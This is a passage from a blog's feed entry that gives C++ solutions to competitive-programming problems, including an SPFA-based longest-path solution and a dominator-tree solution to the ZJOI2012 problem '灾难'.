class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">nextInt</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>; <span class="type">char</span> buf = <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">isdigit</span>(buf))buf = <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">isdigit</span>(buf)) &#123;</span><br><span class="line">        ret *= <span class="number">10</span>;</span><br><span class="line">        ret += buf - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        buf = <span class="built_in">getchar</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">putInt</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> buf[<span class="number">10</span>], cnt;</span><br><span class="line">    cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x)buf[cnt++] = x % <span class="number">10</span>, x /= <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">while</span> (cnt--)<span class="built_in">putchar</span>(buf[cnt] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;map[<span class="number">200001</span>];</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">connect</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">        map[a].<span class="built_in">push_back</span>(b);</span><br><span class="line">        map[b].<span class="built_in">push_back</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SPFA</span> :Graph &#123;</span><br><span class="line">    <span class="type">int</span> dis[<span class="number">200001</span>]; <span class="type">bool</span> inQueue[<span class="number">200001</span>];</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">work</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">memset</span>(inQueue, <span class="number">0</span>, <span class="keyword">sizeof</span> inQueue);</span><br><span class="line">        <span class="built_in">memset</span>(dis, <span class="number">-1</span>, <span class="keyword">sizeof</span> dis);</span><br><span class="line">        queue&lt;<span class="type">int</span>&gt;joblist;</span><br><span class="line">        joblist.<span class="built_in">push</span>(x); dis[x] = <span class="number">0</span>;</span><br><span class="line">        inQueue[x] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (joblist.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> current = joblist.<span class="built_in">front</span>(); joblist.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; map[current].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dis[map[current][i]] &lt; <span class="number">1</span> + dis[current]) &#123;</span><br><span class="line">                    dis[map[current][i]] = dis[current] + <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span> (!inQueue[map[current][i]]) &#123;</span><br><span class="line">                        joblist.<span class="built_in">push</span>(map[current][i]);</span><br><span class="line">                        inQueue[map[current][i]] = <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;G;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">CityEdge</span> &#123;</span><br><span class="line">    <span class="type">int</span> a, b, city_id;</span><br><span class="line">    <span class="keyword">friend</span> <span class="type">bool</span> <span class="keyword">operator</span> &lt;(<span class="type">const</span> CityEdge &amp;a, <span class="type">const</span> CityEdge &amp;b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a.b == b.b)<span class="keyword">return</span> a.a &lt; b.a;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> a.b &lt; b.b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">vector&lt;CityEdge&gt;temp;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="built_in">nextInt</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> a = <span class="built_in">nextInt</span>(), b = <span class="built_in">nextInt</span>(), c = <span class="built_in">nextInt</span>();</span><br><span class="line">        <span class="keyword">if</span> (a &gt; b)<span class="built_in">swap</span>(a, b);</span><br><span class="line">        <span class="keyword">if</span> (a &gt; c)<span class="built_in">swap</span>(a, c);</span><br><span class="line">        <span class="keyword">if</span> (b &gt; c)<span class="built_in">swap</span>(b, c);</span><br><span class="line">        temp.<span class="built_in">push_back</span>(&#123; a,b,i &#125;);</span><br><span class="line">        temp.<span class="built_in">push_back</span>(&#123; a,c,i &#125;);</span><br><span class="line">        temp.<span class="built_in">push_back</span>(&#123; b,c,i &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(temp.<span class="built_in">begin</span>(), temp.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; temp.<span class="built_in">size</span>() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (temp[i].a == temp[i + <span class="number">1</span>].a&amp;&amp;temp[i].b == temp[i + <span class="number">1</span>].b)</span><br><span class="line">            G.<span class="built_in">connect</span>(temp[i].city_id, temp[i + <span class="number">1</span>].city_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> should_from, max_dis = <span class="number">0</span>;</span><br><span class="line">    G.<span class="built_in">work</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (G.dis[i] &gt; max_dis)max_dis = G.dis[i], should_from = i;</span><br><span class="line">    &#125;</span><br><span class="line">    G.<span class="built_in">work</span>(should_from);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n - <span class="number">1</span>; i++)<span class="keyword">if</span> (G.dis[i] &gt; max_dis)max_dis = G.dis[i];</span><br><span class="line">    <span class="built_in">putInt</span>(max_dis<span class="number">+1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="灾难">灾难</h2><blockquote><p>来源: BZOJ2815/ZJOI2012</p></blockquote><p>一个物种灭绝当且仅当这个物种的所有食物的lca灭绝</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> memset(x,y) memset(x,y,sizeof x)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxn 70000</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;map[maxn];</span><br><span class="line">    <span class="type">int</span> inDegree[maxn];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;topoOrder;</span><br><span class="line">    <span class="built_in">Graph</span>() &#123;</span><br><span class="line">        <span class="built_in">memset</span>(inDegree, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; &amp;<span class="keyword">operator</span> [](<span class="type">int</span> pos) &#123;</span><br><span class="line">        <span class="keyword">return</span> map[pos];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">connect</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to)</span> </span>&#123;</span><br><span class="line">        map[from].<span class="built_in">push_back</span>(to);</span><br><span class="line">        inDegree[to]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">topoSort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        queue&lt;<span class="type">int</span>&gt;joblist;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">            <span class="keyword">if</span> (!inDegree[i])joblist.<span class="built_in">push</span>(i);</span><br><span class="line">        <span class="keyword">while</span> (!joblist.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> current = joblist.<span class="built_in">front</span>(); joblist.<span class="built_in">pop</span>();</span><br><span class="line">            topoOrder.<span class="built_in">push_back</span>(current);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; map[current].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">                inDegree[map[current][i]]--;</span><br><span class="line">                <span class="keyword">if</span> (!inDegree[map[current][i]])</span><br><span class="line">                    joblist.<span class="built_in">push</span>(map[current][i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;G;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DistinctTree</span> &#123;</span><br><span class="line">    <span class="type">int</span> depth[maxn], father[maxn][<span class="number">17</span>];</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;map[maxn];</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lca</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">-1</span>)<span class="keyword">return</span> y;</span><br><span class="line">        <span class="keyword">if</span> (depth[x] &lt; depth[y])<span class="built_in">swap</span>(x, y);</span><br><span class="line">        <span class="type">int</span> delta = depth[x] - depth[y];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span> &amp;&amp; delta; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (delta&amp;(<span class="number">1</span> &lt;&lt; i)) &#123;</span><br><span class="line">                x = father[x][i];</span><br><span class="line">                delta ^= <span class="number">1</span> &lt;&lt; i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">16</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (father[x][i] != father[y][i])</span><br><span class="line">                x = father[x][i], y = father[y][i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (x == y ? x : father[x][<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">DistinctTree</span>() &#123;</span><br><span class="line">        <span class="built_in">memset</span>(depth, <span class="number">0</span>); <span class="built_in">memset</span>(father, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; &amp;<span class="keyword">operator</span>[](<span class="type">int</span> pos) &#123;</span><br><span class="line">        <span class="keyword">return</span> map[pos];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp;topo)</span> </span>&#123;</span><br><span class="line">        depth[<span class="number">0</span>] = <span class="number">1</span>;<span class="comment">//super node</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = topo.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">int</span> current = topo[i];</span><br><span class="line">            <span class="type">int</span> current_father = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G[current].<span class="built_in">size</span>(); i++)</span><br><span class="line">                current_father = <span class="built_in">lca</span>(current_father, G[current][i]);</span><br><span class="line">            <span class="keyword">if</span> (current_father == <span class="number">-1</span>)current_father = <span class="number">0</span>;</span><br><span class="line">            map[current_father].<span class="built_in">push_back</span>(current);</span><br><span class="line">            depth[current] = depth[current_father] + <span class="number">1</span>;</span><br><span class="line">            father[current][<span class="number">0</span>] = current_father;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span> &amp;&amp; father[current][i]; i++)</span><br><span class="line">                father[current][i + <span class="number">1</span>] = father[father[current][i]][i];</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> current</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;DT;</span><br><span class="line"><span class="type">int</span> FINAL[maxn];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">FINAL_DFS</span><span class="params">(<span class="type">int</span> current)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; DT[current].<span class="built_in">size</span>(); i++)</span><br><span class="line">        cnt += <span class="built_in">FINAL_DFS</span>(DT[current][i]);</span><br><span class="line">    <span class="keyword">return</span> FINAL[current] = cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin &gt;&gt; n; <span class="type">int</span> other;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        cin &gt;&gt; other;</span><br><span class="line">        <span class="keyword">while</span> (other) &#123;</span><br><span class="line">            G.<span class="built_in">connect</span>(i, other);</span><br><span class="line">            cin &gt;&gt; other;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    G.<span class="built_in">topoSort</span>();</span><br><span class="line">    DT.<span class="built_in">build</span>(G.topoOrder);</span><br><span class="line">    <span class="built_in">FINAL_DFS</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        cout &lt;&lt; FINAL[i] - <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;一些高中时候的奇怪题解&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;Freda的城堡&quot;&gt;Freda的城堡&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;来源: codevs 2490/bzoj3035/gxyz.openjudge.cn1186</summary>
      
    
    
    
    
    <category term="ACM" scheme="https://blog.frankli.site/tags/ACM/"/>
    
    <category term="高中" scheme="https://blog.frankli.site/tags/%E9%AB%98%E4%B8%AD/"/>
    
  </entry>
  
</feed>
